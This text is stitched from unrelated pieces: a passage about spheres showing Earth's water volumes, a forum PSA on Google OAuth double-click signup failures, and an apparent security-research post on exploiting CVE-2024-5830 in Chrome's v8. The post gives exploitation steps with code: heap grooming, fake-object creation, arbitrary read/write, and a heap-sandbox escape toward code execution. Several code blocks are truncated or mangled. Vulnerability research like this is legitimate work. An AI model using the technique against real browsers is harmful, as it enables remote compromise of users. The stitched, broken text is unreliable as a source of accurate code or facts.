<p>The largest sphere represents all of Earth's water. Its diameter is about 860 miles (the distance from Salt Lake City, Utah, to Topeka, Kansas) and has a volume of about 332,500,000 cubic miles (mi<sup>3</sup>) (1,386,000,000 cubic kilometers (km<sup>3</sup>)). This sphere includes all of the water in the oceans, ice caps, lakes, rivers, groundwater, atmospheric water, and even the water in you, your dog, and your tomato plant.</p>
<p><strong>Liquid fresh water</strong></p>
<p>How much of the total water is fresh water, which people and many other life forms need to survive? The blue sphere over Kentucky represents the world's liquid fresh water (groundwater, lakes, swamp water, and rivers). The volume comes to about 2,551,100 mi<sup>3</sup> (10,633,450 km<sup>3</sup>), of which 99 percent is groundwater, much of which is not accessible to humans. The diameter of this sphere is about 169.5 miles (272.8 kilometers).</p>
<p><strong>Water in lakes and rivers</strong></p>
<p>Do you notice the "tiny" bubble over Atlanta, Georgia? That one represents fresh water in all the lakes and rivers on the planet. Most of the water people and life of earth need every day comes from these surface-water sources. The volume of this sphere is about 22,339 mi<sup>3</sup> (93,113 km<sup>3</sup>). The diameter of this sphere is about 34.9 miles (56.2 kilometers). Yes, Lake Michigan looks way bigger than this sphere, but you have to try to imagine a bubble almost 35 miles high‚Äîwhereas the average depth of Lake Michigan is less than 300 feet (91 meters).</p>

We've since reproduced the issue with several other companies' signup flows.</p><p>What's the issue?</p><p>A few months ago we (Flat.app) noticed that a meaningful fraction of signups-via-Google to our SaaS product were failing. I recently found out why, so I'm sharing this PSA for anyone facing a similar problem.</p><p>If your app supports "Sign in with Google", it's likely that new signups will fail if, on Google's OAuth consent screen, a user clicks "Continue" more than once. The error will probably be inscrutable to the user, depending on your setup, so they may just give up instead of trying again. In our case, we were losing around 15% of signups!</p><p>I encountered this issue while investigating failed signups for our product, but I've also reproduced it with other popular products including ChatGPT, Doordash, Expedia, and Snyk, so I assume it's widespread.</p><p>Some of these products use Auth0, as do we, but others don't, and they still generate an error of one kind or another.</p><p>For Auth0 specifically, the error is "You may have pressed the back button, refreshed during login, opened too many login dialogs, or there is some issue with cookies, since we couldn't find your session. Try logging in again from the application and if the problem persists please contact the administrator." The error tries to be helpful by listing potential causes, but it fails to mention the actual cause. That's because Auth0 wasn't aware of this failure mode, based on my correspondence with them.</p><p>Why does this happen?</p><p>After a user clicks "Continue" the first time, Google will respond with a 302 to the callback URL, passing along the authorization code and replaying the OAuth 2.0 state param. If the user clicks "Continue" again, Google will respond again with a 302 to the callback URL. The browser will abort the first pending request and issue a new request to the callback URL. Importantly, the state param is, as it should be, the same in both requests, and it typically incorporates a nonce (see https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-protecting-redirect-based-f). Since the nonce will already have been consumed by the first request, the second request will be rejected.</p><p>Why would a user click "Continue" twice?</p><p>Simple: poor UX in Google's consent screen. The "Continue" button provides almost no feedback that the click was registered, and the screen provides no feedback that any requests are pending. So, some users will naturally try again, especially if they're on a slow connection.</p><p>What can Google do?</p><p>Google could disable the "Continue" button with a loading indicator after the first click. That would ensure it's not possible to click it twice, and it would provide an improved UX by showing the user that something is happening.</p><p>Google's OAuth consent screen was redesigned at some point in the past few years. Allowing "Continue" to be clicked twice, with no visible feedback, may be an unintended regression.</p><p>What can I do?</p><p>Test this in your own application. Be sure to deauthorize your app before each test run so that you get the OAuth consent screen. You can do that in your Google account's Data &amp; privacy section.</p><p>Also, check your logs for errors to see if you're losing signups. See if you can detect this scenario and, if so, provide a better experience to users, e.g., by acknowledging what caused the error and giving them a clearer path to continue.</p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>

<div id="readability-page-1" class="page"><section>
	
<p>In this post, I‚Äôll exploit <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a type confusion bug in v8, the Javascript engine of Chrome that I reported in May 2024 as <a href="https://issues.chromium.org/issues/342456991">bug 342456991</a>. The bug was fixed in version <a href="https://chromereleases.googleblog.com/2024/06/stable-channel-update-for-desktop.html">126.0.6478.56/57</a>. This bug allows remote code execution (RCE) in the renderer sandbox of Chrome by a single visit to a malicious site.</p>
<h2 id="object-map-and-map-transitions-in-v8">Object map and map transitions in V8<a href="#object-map-and-map-transitions-in-v8" aria-label="Object map and map transitions in V8"></a></h2>
<p>This section contains some background materials in object maps and transitions that are needed to understand the vulnerability. Readers who are familiar with this can skip to the next section.</p>
<p>The concept of a map (or hidden class) is fairly fundamental to Javascript interpreters. It represents the memory layout of an object and is crucial in the optimization of property access. There are already many good articles that go into much more detail on this topic. I particularly recommend ‚Äú<a href="https://mathiasbynens.be/notes/shapes-ics#object-model">JavaScript engine fundamentals: Shapes and Inline Caches</a>‚Äù by Mathias Bynens.</p>
<p>A map holds an array of property descriptors (<a href="https://v8.dev/blog/fast-properties#hiddenclasses-and-descriptorarrays"><code>DescriptorArrays</code></a>) that contains information about each property. It also holds details about the elements of the object and its <a href="https://v8.dev/blog/elements-kinds">type</a>.</p>
<p>Maps are shared between objects with the same property layout. For example, the following objects both have a single property <code>a</code> of type <code>SMI</code> (31 bit integers), so they can share the same map.</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 10000};  //&lt;------ same map as o1, MapA
</code></pre>
<p>Maps also account property types in an object. For example, the following object, <code>o3</code> has a map different from <code>o1</code> and <code>o2</code>, because its property <code>a</code> is of type <code>double</code> (<code>HeapNumber</code>), rather than <code>SMI</code>:</p>
<pre><code>
o3 = {a : 1.1};
</code></pre>
<p>When a new property is added to an object, if a map does not already exist for the new object layout, a new map will be created.</p>
<pre><code>
o1.b = 1; //&lt;------ new map with SMI properties a and b
</code></pre>
<p>When this happens, the old and the new map are related by a transition:</p>
<pre><code>
%DebugPrint(o2);
DebugPrint: 0x3a5d00049001: [JS_OBJECT_TYPE]
 - map: 0x3a5d00298911 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x3a5d00002b19: [String] in ReadOnlySpace: #a: 10000 (const data field 0), location: in-object
 }
0x3a5d00298911: [Map] in OldSpace
 - map: 0x3a5d002816d9 &lt;MetaMap (0x3a5d00281729 )&gt;
 ...
 - instance descriptors #1: 0x3a5d00049011 
 - transitions #1: 0x3a5d00298999 <map>
     0x3a5d00002b29: [String] in ReadOnlySpace: #b: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x3a5d00298999 <map>
 ...
</map></map></map></code></pre>
<p>Note that the map of <code>o2</code> contains a transition to another map (<code>0x3a5d00298999</code>), which is the newly created map for <code>o3</code>:</p>
<pre><code>
%DebugPrint(o3);
DebugPrint: 0x3a5d00048fd5: [JS_OBJECT_TYPE]
 - map: 0x3a5d00298999 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x3a5d00002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
    0x3a5d00002b29: [String] in ReadOnlySpace: #b: 1 (const data field 1), location: properties[0]
 }
0x3a5d00298999: [Map] in OldSpace
 - map: 0x3a5d002816d9 &lt;MetaMap (0x3a5d00281729 )&gt;
 ...
 - back pointer: 0x3a5d00298911 <map>
 ...
</map></map></code></pre>
<p>Conversely, the map of <code>o2</code> (<code>0x3a5d00298911</code>) is stored in this new map as the back pointer. A map can store multiple transitions in a <code>TransitionArray</code>. For example, if another property <code>c</code> is added to <code>o2</code>, then the <code>TransitionArray</code> will contain two transitions, one to property <code>b</code> and another to property <code>c</code>:</p>
<pre><code>
o4 = {a : 1};
o2.c = 1;
%DebugPrint(o4);
DebugPrint: 0x2dd400049055: [JS_OBJECT_TYPE]
 - map: 0x2dd400298941 <map> [FastProperties]
 - All own properties (excluding elements): {
    0x2dd400002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
0x2dd400298941: [Map] in OldSpace
 - map: 0x2dd4002816d9 &lt;MetaMap (0x2dd400281729 )&gt;
 ...
 - transitions #2: 0x2dd400298a35 Transition array #2:
     0x2dd400002b39: [String] in ReadOnlySpace: #c: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x2dd400298a0d <map>
     0x2dd400002b29: [String] in ReadOnlySpace: #b: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x2dd4002989c9 <map>
 ...
</map></map></map></code></pre>
<p>When a field of type <code>SMI</code> in an object is assigned a <code>double</code> (<code>HeapNumber</code>) value, because the <code>SMI</code> type cannot hold a <code>double</code> value, the map of the object needs to change to reflect this:</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 1};
o1 = {a : 1.1};
%DebugPrint(o1);
DebugPrint: 0x1b4e00049015: [JS_OBJECT_TYPE]
 - map: 0x1b4e002989a1 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x1b4e00002b19: [String] in ReadOnlySpace: #a: 0x1b4e00049041  (const data field 0), location: in-object
 }
...
%DebugPrint(o2);
DebugPrint: 0x1b4e00049005: [JS_OBJECT_TYPE]
 - map: 0x1b4e00298935 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x1b4e00002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
0x1b4e00298935: [Map] in OldSpace
 ...
 - deprecated_map
 ...
</map></map></code></pre>
<p>Note that, not only do <code>o1</code> and <code>o2</code> have different maps, but the map of <code>o2</code> is also marked as <code>deprecated</code>. This means that when a new object of the same property layout is created, it‚Äôll use the map of <code>o1</code> (<code>0x1b4e002989a1</code>) instead of that of <code>o2</code> (<code>0x1b4e00298935</code>) because a more general map, the map of <code>o1</code>, whose field can represent both <code>HeapNumber</code> and <code>SMI</code>, is now available. Moreover, the map of <code>o2</code> will also be updated to the map of <code>o1</code> when its properties are accessed. This is done via the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=272"><code>UpdateImpl</code></a> function:</p>
<pre><code>
Handle<map> MapUpdater::UpdateImpl() {
  ...
  if (FindRootMap() == kEnd) return result_map_;
  if (FindTargetMap() == kEnd) return result_map_;
  if (ConstructNewMap() == kAtIntegrityLevelSource) {
    ConstructNewMapWithIntegrityLevelTransition();
  }
  ...
  return result_map_;
}
</map></code></pre>
<p>Essentially, the function uses the <code>back pointer</code> of a <code>map</code> to retrace the transitions until it reaches the first map that does not have a back<code>pointer</code> (the <code>RootMap</code>). It then goes through the transitions from the <code>RootMap</code> to check if there already exists a suitable map in the transitions that can be used for the object (<code>FindTargetMap</code>). If a suitable map is found, then <code>ConstructNewMap</code> will create a new map which is then used by the object.</p>
<p>For example, in the following case, a map with three properties becomes deprecated when the second property is assigned a <code>HeapNumber</code> value:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1; //&lt;---- Map now has 3 SMI properties
obj.b = 1.1 //&lt;----- original map becomes deprecated and a new map is created
</code></pre>
<p>In this case, two new maps are created. First a map with properties <code>a</code> and <code>b</code> of types <code>SMI</code> and <code>HeapNumber</code> respectively, then another map with three properties, <code>a : SMI</code>, <code>b : HeapNumber</code> and <code>c : SMI</code> to accommodate the new property layout:</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361" alt="Diagram showing the two new maps that have been created." width="697" height="361" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361 697w, https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=300 300w" sizes="(max-width: 697px) 100vw, 697px" data-recalc-dims="1"></p>
<p>In the above image, the red maps become deprecated and the green maps are newly created maps. After the property assignment, <code>obj</code> will be using the newly created map that has properties <code>a</code>, <code>b</code> and <code>c</code> and the transitions to the deprecated red maps are removed and replaced by the new green transitions.</p>
<p>In v8, object properties can be stored in an array or in a dictionary. Objects with properties stored in an array are referred to as fast objects, while objects with properties in dictionaries are dictionary objects. Map transitions and deprecations are specific to fast objects and normally, when a map deprecation happens, another fast map is created by <code>UpdateImpl</code>. This, however, is not necessarily the case. Let‚Äôs take a look at a slightly different example:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;    //&lt;---- MapB
obj.c = 1;    //&lt;---- MapC

obj2 = {a : 1};
obj2.b = 1;  //&lt;----- MapB
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated
</code></pre>
<p>Assigning a <code>HeapNumber</code> to <code>obj2.b</code> causes both the original map of <code>obj2</code> (<code>MapB</code>), as well as the map of <code>obj</code> (<code>MapC</code>) to become deprecated. This is because the map of <code>obj</code> (<code>MapC</code>) is now a transition of a deprecated map (<code>MapB</code>), which causes it to become deprecated as well:</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358" alt="Diagram showing the deprecation of previous maps." width="688" height="358" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358 688w, https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=300 300w" sizes="(max-width: 688px) 100vw, 688px" data-recalc-dims="1"></p>
<p>As <code>obj</code> now has a deprecated map, its map will be updated when any of its property is accessed:</p>
<pre><code>
x = obj.a; //&lt;---- calls UpdateImpl to update the map of obj
</code></pre>
<p>In this case, a new map has to be created and a new transition is added to the map of <code>obj2</code>. However, there is a limited number of transitions that a map can hold. Prior to adding a new transition, a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=999">check</a> is carried out to ensure that the map can hold another transition:</p>
<pre><code>
MapUpdater::State MapUpdater::ConstructNewMap() {
  ...
  if (maybe_transition.is_null() &amp;&amp;
      !TransitionsAccessor::CanHaveMoreTransitions(isolate_, split_map)) {
    return Normalize("Normalize_CantHaveMoreTransitions");
  }
  ...
</code></pre>
<p>If no more transitions can be added, then a new dictionary map will be created via <code>Normalize</code>.</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1;

obj2 = {a : 1};
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated

//Add transitions to the map of obj2
for (let i = 0; i &lt; 1024 + 512; i++) {
  let tmp = {a : 1};
  tmp.b = 1.1;
  tmp['c' + i] = 1;
}

obj.a = 1; //&lt;----- calls UpdateImpl to update map of obj
</code></pre>
<p>As the map of <code>obj2</code> cannot hold anymore transitions, a new dictionary map is created for <code>obj</code> after its property is accessed. This behavior is somewhat unexpected, so <code>Update</code> is often followed by a debug assertion to ensure that the updated map is not a dictionary map (<code>DCHECK</code> is only active in a debug build):</p>
<pre><code>
Handle<map> Map::PrepareForDataProperty(Isolate* isolate, Handle<map> map,
                                        InternalIndex descriptor,
                                        PropertyConstness constness,

<p>While most uses of the function <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map.cc;l=1903"><code>PrepareForDataProperty</code></a> cannot result in a dictionary map after <code>Update</code> is called, <code>PrepareForDataProperty</code> can be called by <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=4088"><code>CreateDataProperty</code></a> via <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3539"><code>TryFastAddDataProperty</code></a>, which may result in a dictionary map after updating. There are different paths that use <code>CreateDataProperty</code>, but one particularly interesting path is in object cloning. When an object is copied using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals">spread syntax</a>, a shallow copy of the original object is created:</p>
<pre><code>
var obj1 = {a : 1};
const clonedObj = { ...obj1 };
</code></pre>
<p>In this case, <code>CreateDataProperty</code> is used for creating new properties in <code>clonedObj</code> and to update its map when appropriate. However, if the object being cloned, <code>obj1</code> contains a property accessor, then it‚Äôll be called while the object is being cloned. For example, in the following case:</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  return 1;
});

var y = {...x};
</code></pre>
<p>In this case, when <code>x</code> is cloned into <code>y</code>, the property accessor <code>prop</code> in <code>x</code> is called after the property <code>a0</code> is copied to <code>y</code>. At this point, the map of <code>y</code> contains only the <code>SMI</code> property <code>a0</code> and it is possible for the accessor to cause the map of <code>y</code> to become deprecated.</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  let obj = {};
  obj.a0 = 1;   //&lt;--- obj has same map as y at this point
  obj.a0 = 1.5;  //&lt;--- map of y becomes deprecated
  return 1;
});

var y = {...x};
</code></pre>
<p>When <code>CreateDataProperty</code> is called to copy the property <code>prop</code>, <code>Update</code> in <code>PrepareForDataProperty</code> is called to update the deprecated map of <code>y</code>. As explained before, by adding transitions to the map of <code>obj</code> in the property accessor, it is possible to cause the map update to return a dictionary map for <code>y</code>. Since the subsequent use of the updated map in <code>PrepareForDataProperty</code> assumes the updated map to be a fast map, rather than a dictionary map, this can corrupt the object <code>y</code> in various ways.</p>
<h2 id="gaining-arbitrary-read-and-write-in-the-v8-heap">Gaining arbitrary read and write in the v8 heap<a href="#gaining-arbitrary-read-and-write-in-the-v8-heap" aria-label="Gaining arbitrary read and write in the v8 heap"></a></h2>
<p>To begin with, let‚Äôs take a look at how the updated map is used in <code>PrepareForDataProperty</code>:</p>
<pre><code>
Handle<map> Map::PrepareForDataProperty(Isolate* isolate, Handle<map> map,
                                        InternalIndex descriptor,
                                        PropertyConstness constness,
                                        Handle</map></map></code></pre>
<p>The updated <code>map</code> is first used by <code>UpdateDescriptorForValue</code>.</p>
<pre><code>
Handle<map> UpdateDescriptorForValue(Isolate* isolate, Handle<map> map,
                                     InternalIndex descriptor,
                                     PropertyConstness constness,
                                     Handle</map></map></code></pre>
<p>Within <code>UpdateDescriptorForValue</code> the <code>instance_descriptors</code> of <code>map</code> are accessed. The <code>instance_descriptors</code> contain information about properties in the map but it is only relevant for fast maps. For a dictionary map, it is always an empty array with zero length. Accessing <code>instance_descriptors</code> of a dictionary map would therefore result in out-of-bounds (OOB) access to the empty array. In particular, the call to <code>ReconfigureToDataField</code> can modify entries in the <code>instance_descriptors</code>. While this may look like a promising OOB write primitive, the problem is that zero length descriptor arrays in v8 point to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/roots/roots.h;l=90">empty_descriptor_array</a> that is stored in a read-only region:</p>
<pre><code>
V(DescriptorArray, empty_descriptor_array, EmptyDescriptorArray)
</code></pre>
<p>Any OOB write to the <code>empty_descriptor_array</code> is only going to write to the read-only memory region and cause a crash. To avoid this, I need to cause <code>CanHoldValue</code> to return <code>true</code> so that <code>ReconfigureToDataField</code> is not called. In the call to <code>CanHoldValue</code>, an OOB entry to the <code>empty_descriptor_array</code> is read and then certain conditions are checked:</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>Although <code>empty_descriptor_array</code> is stored in a read-only region and I cannot control the memory content that is behind it, the read index, <code>descriptor,</code> is the array index that corresponds to the property <code>prop</code>, which I can control. By changing the number of properties that precede <code>prop</code> in <code>x</code>, I can control the OOB read offset to the <code>empty_descriptor_array</code>. This allows me to choose an appropriate offset so that the conditions in <code>CanHoldValue</code> are satisfied.</p>
<p>While this avoids an immediate crash, it is not exactly useful as far as exploits go. So, let‚Äôs take a look at what comes next after a dictionary map is returned from <code>PrepareForDataProperty</code>.</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>After the <code>new_map</code> returned, its <code>instance_descriptors</code>, which is the <code>empty_descriptor_array</code>, is read again at offset <code>descriptor</code>, and the result is used to provide another offset in a property write:</p>
<pre><code>
void JSObject::WriteToField(InternalIndex descriptor, PropertyDetails details,
                            Tagged</code></pre>
<p>In the above, <code>index</code> is encoded in the <code>PropertyDetails</code> and is used in <code>FastPropertyAtPut</code> to write a property in the resulting object. However, <code>FastPropertyAtPut</code> assumes that the object has fast properties stored in a <code>PropertyArray</code> while our object is in fact a dictionary object with properties stored in a <code>NameDictionary</code>. This causes confusion between <code>PropertyArray</code> and <code>NameDictionary</code>, and because <code>NameDictionary</code> contains a few more internal fields than <code>PropertyArray</code>, writing to a <code>NameDictionary</code> using an offset that is meant for a <code>PropertyArray</code> can end up overwriting some internal fields in the <code>NameDictionary</code>. A common way to exploit a confusion between fast and dictionary objects is to overwrite the <code>capacity</code> field in the <code>NameDictionary</code>, which is used for checking the bounds when the <code>NameDictionary</code> is accessed (similar to the method that I used to exploit another v8 bug in this <a href="https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug">post</a>).</p>
<p>However, as I cannot fully control the <code>PropertyDetails</code> that comes from the OOB read of the <code>empty_descriptor_array</code>, I wasn‚Äôt able to overwrite the <code>capacity</code> field of the <code>NameDictionary</code>. Instead, I managed to overwrite another internal field, <code>elements</code> of the <code>NameDictionary</code>. Although the <code>elements</code> field is not normally used for property access, it is used in <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3779"><code>MigrateSlowToFast</code></a> as a bound for accessing dictionary properties:</p>
<pre><code>
void JSObject::MigrateSlowToFast(Handle object,
                                 int unused_property_fields,
                                 const char* reason) {
  ...
  Handle iteration_order;
  int iteration_length;
  if constexpr (V8_ENABLE_SWISS_NAME_DICTIONARY_BOOL) {
    ...
  } else {
    ...
    iteration_length = dictionary-&gt;NumberOfElements();  //&lt;---- elements field
  }
  ...
  for (int i = 0; i get(i)));
      k = dictionary-&gt;NameAt(index);

      value = dictionary-&gt;ValueAt(index);     //DetailsAt(index);
    }
    ...
  }
  ...
}
</code></pre>
<p>In <code>MigrateSlowToFast</code>, <code>dictionary-&amp;gt;NumberOfElements()</code> is used as a bound of the property offsets in a loop that accesses the property <code>NameDictionary</code>. So by overwriting <code>elements</code> to a large value, I can cause OOB read when the property values are read in the loop. These property values are then copied to a newly created fast object. By arranging the heap carefully, I can control the <code>value</code> that is read and have it point to a fake object in the v8 heap.</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587" alt="Diagram displaying how to control the value that is read and have it point to a fake object in the v8 heap." width="685" height="587" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587 685w, https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=300 300w" sizes="(max-width: 685px) 100vw, 685px" data-recalc-dims="1"></p>
<p>In the above, the green box is the actual bounds of the <code>NameDictionary</code>, however, with a corrupted <code>elements</code> field, an OOB access can happen during <code>MigrateSlowToFast</code>, causing it to access the value in the red box, and use it as the value of the property. By arranging the heap, I can place arbitrary values in the red box, and in particular, I can make it point to a fake object that I created.</p>
<p>Heap arrangement in v8 is fairly straightforward as objects are allocated linearly in the v8 heap. To place control values after the <code>NameDictionary</code>, I can allocate arrays after the object is cloned and then write control values to the array entries.</p>
<pre><code>
var y = {...x};  //&lt;---- NameDictionary allocated

//Placing control values after the NameDictionary
var arr = new Array(256);
for (let i = 0; i &lt; 7; i++) {
  arr[i] = new Array(256);
  for (let j = 0; j &lt; arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}
</code></pre>
<p>To make sure that the value I placed after the <code>NameDictionary</code> points to a fake object, I need to know the address of the fake object. As I pointed out in a <a href="https://powerofcommunity.net/poc2022/ManYueMo.pdf">talk</a> that I gave at the <a href="https://powerofcommunity.net/2022.htm">POC2022</a> conference, object addresses in v8 can be predicted reliably by simply knowing the version of Chrome. This allows me to work out the address of the fake object to use:</p>
<pre><code>
var dblArray = [1.1,2.2];
var dblArrayAddr = 0x4881d;  //&lt;---- address of dblArray is consistent across runs

var dblArrayEle = dblArrayAddr - 0x18;
//Creating a fake double array as an element with length 0x100
dblArray[0] = i32tof(dblArrMap, 0x725);
dblArray[1] = i32tof(dblArrayEle, 0x100);
</code></pre>
<p>By using the known addresses of objects and their maps, I can create both the fake object and also obtain its address.</p>
<p>Once the heap is prepared, I can trigger <code>MigrateSlowToFast</code> to access the fake object. This can be done by first making the cloned object, <code>y</code>, a prototype of another object, <code>z</code>. Accessing any property of <code>z</code> will then trigger <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/ic/ic.cc;l=441;bpv=0;bpt=0"><code>MakePrototypesFast</code></a>, which calls <code>MigrateSlowToFast</code> for the object <code>y</code>:</p>
<pre><code>
var z = {};
z.__proto__ = y;
z.p;    //&lt;------ Calls MigrateSlowToFast for y
</code></pre>
<p>This then turns <code>y</code> into a fast object, with the fake object that I prepared earlier accessible as a property of <code>y</code>. A useful fake object is a fake double array with a large <code>length</code>, which can then be used to cause an OOB access to its elements.</p>
<p>Once an OOB access to the fake double array is achieved, gaining arbitrary read and write in the v8 heap is rather straightforward. It essentially consists of the following steps:</p>
<ol>
<li>First, place an <code>Object</code> <code>Array</code> after the fake double array, and use the OOB read primitive in the fake double array to read the addresses of the objects stored in this array. This allows me to obtain the address of any V8 object.</li>
<li>Place another double array, <code>writeArr</code> after the fake double array, and use the OOB write primitive in the fake double array to overwrite the <code>element</code> field of <code>writeArr</code> to an object address. Accessing the elements of <code>writeArr</code> then allows me to read/write to arbitrary addresses.</li>
</ol>
<h2 id="thinking-outside-of-the-heap-sandbox">Thinking outside of the heap sandbox<a href="#thinking-outside-of-the-heap-sandbox" aria-label="Thinking outside of the heap sandbox"></a></h2>
<p>The recently introduced <a href="https://v8.dev/blog/sandbox">v8 heap sandbox</a> isolates the v8 heap from other process memory, such as executable code, and prevents memory corruptions within the v8 heap from accessing memory outside of the heap. To gain code execution, a way to escape the heap sandbox is needed.</p>
<p>In Chrome, <a href="https://developer.mozilla.org/en-US/docs/Web/API">Web API</a> objects, such as the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model"><code>DOM</code></a> object, are implemented in <a href="https://www.chromium.org/blink/">Blink</a>. Objects in Blink are allocated outside of the v8 heap and are represented as api objects in v8:</p>
<pre><code>
var domRect = new DOMRect(1.1,2.3,3.3,4.4);
%DebugPrint(domRect);

DebugPrint: 0x7610003484c9: [[api object] 0]
 ...
 - embedder fields: 2
 - properties: 0x7610000006f5 
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: 0x7718f770b880
    0, aligned pointer: 0x325d00107ca8
 }
0x7610003b6985: [Map] in OldSpace
 - map: 0x76100022f835 &lt;MetaMap (0x76100022f885 )&gt;
 - type: [api object] 0
 ...
</code></pre>
<p>These objects are essentially wrappers to objects in Blink, and they contain two <code>embedder fields</code> that store the locations of the actual Blink object, as well as their actual type. Although <code>embedder fields</code> show up as pointer values in the <code>DebugPrint</code>, because of the heap sandbox, they are not actually stored as pointers in the v8 object, but as indices to a lookup table that is protected from being modified within the v8 heap.</p>
<pre><code>
bool EmbedderDataSlot::ToAlignedPointer(Isolate* isolate,
                                        void** out_pointer) const {
  ...
#ifdef V8_ENABLE_SANDBOX
  // The raw part must always contain a valid external pointer table index.
  *out_pointer = reinterpret_cast(
      ReadExternalPointerField(
          address() + kExternalPointerOffset, isolate));
  return true;
  ...
}
</code></pre>
<p>The external look up table ensures that an <code>embedder field</code> must be a valid index in the table, and also any pointer returned from reading the <code>embedder field</code> must point to a valid Blink object. However, with arbitrary read and write in the v8 heap, I can still replace the <code>embedder field</code> of one api object by the <code>embedder field</code> of another api object that has a different type in Blink. This can then be used to cause type confusion in the Blink object.</p>
<p>In particular, I can cause a type confusion between a <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMRect"><code>DOMRect</code></a> and a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/dom_typed_array.h;l=15"><code>DOMTypedArray</code></a>. A <code>DOMRect</code> is a simple data structure, with four properties <code>x</code>, <code>y</code>, <code>width</code>, <code>height</code> specifying its dimensions. <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/geometry/dom_rect.h;l=36;bpv=0;bpt=0">Accessing these properties</a> simply involves writing to and reading from the corresponding offsets in the <code>DOMRect</code> Blink object. By causing a type confusion between a <code>DOMRect</code> and another other Blink object, I can read and write the values of any Blink object from these offsets. In particular, by confusing a <code>DOMRect</code> with a <code>DOMTypedArray</code>, I can overwrite its <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/array_buffer/array_buffer_contents.h;l=157"><code>backing_store_</code></a> pointer, which points to the data storage of the <code>DOMTypedArray</code>. Changing the <code>backing_store_</code> to an arbitrary pointer value and then accessing entries in the <code>DOMTypedArray</code> then gives me arbitrary read and write access to the entire memory space.</p>
<p>To defeat ASLR and identify useful addresses in the process memory, note that each api object also contains an <code>embedder field</code> that stores a pointer to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/platform/bindings/script_wrappable.h;l=211;bpv=0;bpt=0"><code>wrapper_type_info</code></a> of the Blink object. Since these <code>wrapper_type_info</code> are global static objects, by confusing this <code>embedder field</code> with a <code>DOMRect</code> object, I can read the pointer to the <code>wrapper_type_info</code> as a property in a <code>DOMRect</code>. In particular, I can now read the address of the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/common/ptr-compr.cc;l=26;bpv=0;bpt=0"><code>TrustedCage::base_</code></a>, which is the offset to a memory region that contains important objects such as JIT code addresses etc. I can now simply compile a JIT function, and modify the address of its JIT code to achieve arbitrary code execution.</p>
<p>The exploit can be found <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE_2024_5830">here</a> with some setup notes.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Conclusion"></a></h2>
